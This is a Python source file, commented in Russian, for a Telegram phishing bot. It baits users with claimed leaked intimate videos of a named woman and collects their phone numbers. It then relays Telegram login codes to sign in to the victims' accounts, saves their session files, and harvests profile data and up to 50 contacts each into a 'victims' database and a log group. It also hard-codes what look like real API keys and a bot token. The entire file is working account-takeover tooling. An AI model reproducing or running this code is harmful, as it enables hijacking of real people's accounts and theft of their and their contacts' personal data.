# telethon_fishing_bot.py
import asyncio
import sqlite3
import json
import os
import shutil
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback, KeyboardButton
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneNumberInvalidError, PhoneCodeInvalidError, FloodWaitError
from telethon.tl.functions.contacts import GetContactsRequest

# === КОНФИГУРАЦИЯ ===
API_ID = 31930134
API_HASH = '12814e71d319a434ee2f126d0c51c314'
BOT_TOKEN = '8734465862:AAEp3_kJZIt0BueDeZN3cpDGd_KaHsY1amY'

# Группа для логов
LOG_GROUP_ID = -5346240560
ADMIN_ID = 8794011165

SESSIONS_DIR = 'sessions'
TDATA_DIR = 'tdata_exports'
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(TDATA_DIR, exist_ok=True)

# === БД ===
conn = sqlite3.connect('victims.db', check_same_thread=False)
c = conn.cursor()
c.execute('DROP TABLE IF EXISTS victims')
c.execute('''CREATE TABLE IF NOT EXISTS victims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    phone TEXT,
    code TEXT,
    session_file TEXT,
    tdata_path TEXT,
    username TEXT,
    full_name TEXT,
    timestamp TEXT
)''')
conn.commit()
print("[SWILL] База данных создана")

class FishingBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending_auth = {}
        self.code_inputs = {}

    async def start(self):
        try:
            await self.bot.start(bot_token=BOT_TOKEN)
            print("[SWILL] Бот @zlataslivvv_bot запущен!")
        except FloodWaitError as e:
            print(f"[SWILL] FloodWait: ждем {e.seconds} секунд")
            await asyncio.sleep(e.seconds)
            await self.bot.start(bot_token=BOT_TOKEN)
            print("[SWILL] Бот @zlataslivvv_bot запущен!")
        
        print("[SWILL] Ожидаем жертв...")
        
        # Отправляем приветствие в группу
        try:
            await self.bot.send_message(LOG_GROUP_ID, "🚀 **БОТ АКТИВИРОВАН**\n@zlataslivvv_bot готов к работе!")
        except:
            pass

        # === ОБРАБОТЧИК /start ===
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            print(f"[DEBUG] /start от {event.sender_id}")
            button = KeyboardButtonRequestPhone(text="📱 ПОДЕЛИТЬСЯ КОНТАКТОМ")
            
            await event.respond(
                "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ИНТИМ ВИДЕО ЗЛАТЫ** 🔥\n\n"
                "В сети появился эксклюзивный слив интимных видео известных личностей!\n"
                "Более 500+ видео с топовыми блогерами и моделями.\n\n"
                "Для получения доступа к архиву необходимо подтвердить возраст (18+)\n"
                "Нажмите кнопку 'Поделиться контактом' для верификации.\n\n"
                "⚡️ Конфиденциальность гарантирована!",
                buttons=[[button]]
            )

        # === ОБРАБОТЧИК ВСЕХ СООБЩЕНИЙ ===
        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            if not event.is_private:
                return
            
            user_id = event.sender_id
            
            # Если это команда /start - пропускаем (обработано выше)
            if event.text and event.text.startswith('/'):
                return
            
            # Обработка контакта
            if event.contact:
                phone = event.contact.phone_number
                if not phone.startswith('+'):
                    phone = '+' + phone
                
                try:
                    user_info = await event.get_sender()
                    username = user_info.username if user_info.username else "Нет username"
                    full_name = f"{user_info.first_name or ''} {user_info.last_name or ''}".strip()
                    if not full_name:
                        full_name = "Неизвестно"
                except:
                    username = "Неизвестно"
                    full_name = "Неизвестно"
                
                await event.respond(
                    "✅ **Верификация пройдена!**\n"
                    f"📱 Номер: `{phone}`\n\n"
                    "Теперь нажмите кнопку ниже для получения кода доступа:",
                    buttons=[
                        [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД ДОСТУПА")]
                    ]
                )
                
                self.pending_auth[user_id] = {
                    'step': 'awaiting_code_request',
                    'phone': phone,
                    'username': username,
                    'full_name': full_name,
                    'user_id': user_id
                }
                return
            
            # Обработка текста
            if event.text:
                text = event.text.strip()
                
                if user_id not in self.pending_auth:
                    return
                
                auth_data = self.pending_auth[user_id]
                step = auth_data.get('step')
                
                if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД ДОСТУПА":
                    await self.request_code(event, user_id, auth_data['phone'])
                    return
                
                if step == 'waiting_code':
                    code = text.replace(' ', '').replace('-', '')
                    if code.isdigit() and len(code) in (5, 6):
                        await self.verify_code(event, user_id, code)
                    else:
                        await event.respond("❌ Введите код из 5-6 цифр")
                    return

        # === ОБРАБОТЧИК CALLBACK ===
        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            user_id = event.sender_id
            data = event.data.decode()
            
            if user_id not in self.pending_auth:
                await event.answer("⚠️ Начните заново /start")
                return
            
            auth_data = self.pending_auth[user_id]
            if auth_data.get('step') != 'waiting_code':
                await event.answer("⚠️ Сначала запросите код")
                return
            
            code_input = self.code_inputs.get(user_id, '')
            
            if data == 'DELETE':
                code_input = code_input[:-1]
                self.code_inputs[user_id] = code_input
                await event.answer(f"Код: {code_input}")
                await self.update_code_message(event, user_id, code_input)
            
            elif data == 'SEND':
                if len(code_input) in (5, 6):
                    await self.verify_code(event, user_id, code_input)
                    self.code_inputs.pop(user_id, None)
                else:
                    await event.answer("❌ 5 или 6 цифр!")
            
            elif data.isdigit():
                if len(code_input) < 6:
                    code_input += data
                    self.code_inputs[user_id] = code_input
                    await event.answer(f"Код: {code_input}")
                    await self.update_code_message(event, user_id, code_input)
                else:
                    await event.answer("⚠️ Максимум 6 цифр!")

    async def update_code_message(self, event, user_id, code_input):
        try:
            await event.edit(
                f"📱 **Введите код доступа**\n\n"
                f"Код: `{code_input}`\n"
                f"Длина: {len(code_input)}/6\n\n"
                "Используйте клавиатуру:",
                buttons=[
                    [KeyboardButtonCallback(text="1", data=b"1"), 
                     KeyboardButtonCallback(text="2", data=b"2"), 
                     KeyboardButtonCallback(text="3", data=b"3")],
                    [KeyboardButtonCallback(text="4", data=b"4"), 
                     KeyboardButtonCallback(text="5", data=b"5"), 
                     KeyboardButtonCallback(text="6", data=b"6")],
                    [KeyboardButtonCallback(text="7", data=b"7"), 
                     KeyboardButtonCallback(text="8", data=b"8"), 
                     KeyboardButtonCallback(text="9", data=b"9")],
                    [KeyboardButtonCallback(text="0", data=b"0"), 
                     KeyboardButtonCallback(text="⌫", data=b"DELETE"), 
                     KeyboardButtonCallback(text="✅", data=b"SEND")]
                ]
            )
        except Exception as e:
            print(f"[ERROR] Обновление: {e}")

    async def request_code(self, event, user_id, phone):
        try:
            temp_client = TelegramClient(f'{SESSIONS_DIR}/temp_{user_id}', API_ID, API_HASH)
            await temp_client.connect()
            
            result = await temp_client.send_code_request(phone)
            
            self.pending_auth[user_id].update({
                'step': 'waiting_code',
                'temp_client': temp_client,
                'phone_code_hash': result.phone_code_hash
            })
            self.code_inputs[user_id] = ''
            
            await event.respond(
                "📱 **Введите код доступа**\n\n"
                "Код был отправлен вам в Telegram\n"
                "Используйте клавиатуру:",
                buttons=[
                    [KeyboardButtonCallback(text="1", data=b"1"), 
                     KeyboardButtonCallback(text="2", data=b"2"), 
                     KeyboardButtonCallback(text="3", data=b"3")],
                    [KeyboardButtonCallback(text="4", data=b"4"), 
                     KeyboardButtonCallback(text="5", data=b"5"), 
                     KeyboardButtonCallback(text="6", data=b"6")],
                    [KeyboardButtonCallback(text="7", data=b"7"), 
                     KeyboardButtonCallback(text="8", data=b"8"), 
                     KeyboardButtonCallback(text="9", data=b"9")],
                    [KeyboardButtonCallback(text="0", data=b"0"), 
                     KeyboardButtonCallback(text="⌫", data=b"DELETE"), 
                     KeyboardButtonCallback(text="✅", data=b"SEND")]
                ]
            )
            
            try:
                await self.bot.send_message(
                    LOG_GROUP_ID,
                    f"📱 **ЗАПРОС КОДА**\n"
                    f"Пользователь: {self.pending_auth[user_id].get('full_name', 'Неизвестно')}\n"
                    f"Username: @{self.pending_auth[user_id].get('username', 'Неизвестно')}\n"
                    f"ID: {user_id}\n"
                    f"Телефон: {phone}"
                )
            except:
                pass
            
        except PhoneNumberInvalidError:
            await event.respond("❌ Неверный номер телефона!")
            self.pending_auth.pop(user_id, None)
        except FloodWaitError as e:
            await event.respond(f"⏳ Подождите {e.seconds//60} минут")
            self.pending_auth.pop(user_id, None)
        except Exception as e:
            await event.respond(f"❌ Ошибка: {str(e)[:100]}")
            self.pending_auth.pop(user_id, None)

    async def verify_code(self, event, user_id, code):
        auth_data = self.pending_auth.get(user_id)
        if not auth_data:
            await event.respond("❌ Сессия истекла")
            return
        
        temp_client = auth_data.get('temp_client')
        if not temp_client:
            await event.respond("❌ Ошибка клиента")
            return
        
        try:
            await temp_client.sign_in(
                phone=auth_data['phone'],
                code=code,
                phone_code_hash=auth_data['phone_code_hash']
            )
            
            session_file = f'{SESSIONS_DIR}/victim_{user_id}.session'
            await temp_client.disconnect()
            
            temp_session = f'{SESSIONS_DIR}/temp_{user_id}.session'
            if os.path.exists(temp_session):
                shutil.move(temp_session, session_file)
            
            tdata_path = await self.export_tdata(user_id, session_file)
            
            c.execute('''INSERT INTO victims 
                         (user_id, phone, code, session_file, tdata_path, username, full_name, timestamp)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (user_id, auth_data['phone'], code, session_file, tdata_path,
                       auth_data.get('username', 'Неизвестно'),
                       auth_data.get('full_name', 'Неизвестно'),
                       datetime.now().isoformat()))
            conn.commit()
            
            await event.respond(
                "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
                "🎬 Ссылка на архив с интим видео:\n"
                "🔗 https://t.me/+XYZ123456789\n\n"
                "⚠️ Сохраните ссылку, архив будет удален через 24 часа!"
            )
            
            try:
                await self.bot.send_message(
                    LOG_GROUP_ID,
                    f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
                    f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
                    f"📱 Username: @{auth_data.get('username', 'Неизвестно')}\n"
                    f"🆔 ID: {user_id}\n"
                    f"📞 Телефон: {auth_data['phone']}\n"
                    f"📁 Данные: `{tdata_path}`\n"
                    f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except:
                pass
            
            self.pending_auth.pop(user_id, None)
            self.code_inputs.pop(user_id, None)
            
        except PhoneCodeInvalidError:
            await event.respond("❌ Неверный код! Попробуйте еще раз.")
        except SessionPasswordNeededError:
            await event.respond("🔐 Требуется 2FA! Введите пароль:")
            self.pending_auth[user_id]['step'] = 'waiting_2fa'
        except PhoneCodeExpiredError:
            await event.respond("⏰ Код истек! Запросите новый.")
            self.pending_auth[user_id]['step'] = 'awaiting_code_request'
        except FloodWaitError as e:
            await event.respond(f"⏳ Подождите {e.seconds//60} минут")
            self.pending_auth.pop(user_id, None)
        except Exception as e:
            await event.respond(f"❌ Ошибка: {str(e)[:100]}")
            self.pending_auth.pop(user_id, None)

    async def export_tdata(self, user_id, session_file):
        tdata_dir = f'{TDATA_DIR}/tdata_{user_id}'
        os.makedirs(tdata_dir, exist_ok=True)
        
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        try:
            me = await client.get_me()
            
            data = {
                'account': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone,
                    'session_path': session_file,
                    'captured_at': datetime.now().isoformat()
                },
                'contacts': []
            }
            
            try:
                contacts = await client(GetContactsRequest(hash=0))
                for user in contacts.users[:50]:
                    data['contacts'].append({
                        'id': user.id,
                        'username': user.username,
                        'first_name': user.first_name,
                        'last_name': user.last_name,
                        'phone': user.phone
                    })
            except:
                pass
            
            with open(f'{tdata_dir}/account.json', 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            shutil.copy(session_file, f'{tdata_dir}/session.session')
            
        except Exception as e:
            print(f"[ERROR] Экспорт: {e}")
        finally:
            await client.disconnect()
        
        return tdata_dir

    async def run(self):
        await self.start()
        print("[SWILL] Бот запущен, нажмите Ctrl+C для остановки")
        await self.bot.run_until_disconnected()

if __name__ == '__main__':
    bot = FishingBot()
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        print("[SWILL] Бот остановлен")
    except Exception as e:
        print(f"[SWILL] Ошибка: {e}")
